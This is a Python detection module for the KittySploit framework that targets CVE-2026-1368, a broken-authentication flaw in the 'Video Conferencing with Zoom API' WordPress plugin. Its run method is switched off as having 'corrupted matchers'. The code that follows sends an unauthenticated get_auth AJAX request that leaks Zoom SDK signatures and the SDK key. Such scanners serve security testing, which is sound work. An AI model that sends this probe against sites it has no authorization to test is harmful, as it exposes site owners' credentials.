#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Zoom WordPress plugin < 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Video Conferencing with Zoom API < 4.6.6 - Unauthenticated SDK Signature Generation Detection',
        'description': 'Zoom WordPress plugin < 4.6.6 contains a broken authentication caused by disabled nonce verification in an AJAX handler, letting unauthenticated attackers generate valid Zoom SDK signatures and retrieve the Zoom SDK key.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'wordpress', 'wp-plugin', 'wp', 'zoom', 'vczapi', 'unauth', 'intrusive'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/218e6655-c5aa-4bce-86b2-cad3bb20020c/',
            'https://wordpress.org/plugins/video-conferencing-with-zoom-api/',
            'https://plugins.trac.wordpress.org/browser/video-conferencing-with-zoom-api/',
        ],
        'cve': 'CVE-2026-1368',
    }

    def run(self):
        return False  # disabled: corrupted matchers
        path = '/wp-content/plugins/video-conferencing-with-zoom-api/README.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/wp-admin/admin-ajax.php'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='action=get_auth&meeting_id=123456789\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = (':true', ':\\', 'type\\', 'sdk\\')
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Video Conferencing with Zoom API < 4.6.6 - Unauthenticated SDK Signature Generation detected', path=path)
            return True
        return False

